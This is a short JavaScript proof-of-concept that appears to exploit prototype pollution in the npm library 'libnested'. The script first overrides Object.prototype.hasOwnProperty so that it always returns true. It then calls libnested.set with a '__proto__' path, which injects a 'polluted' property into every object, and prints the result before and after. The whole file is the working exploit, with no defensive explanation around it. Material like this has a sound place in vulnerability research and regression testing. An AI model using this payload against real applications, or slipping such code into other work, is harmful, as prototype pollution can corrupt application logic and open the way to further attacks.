Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const libnested = require('libnested');
libnested.set({}, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);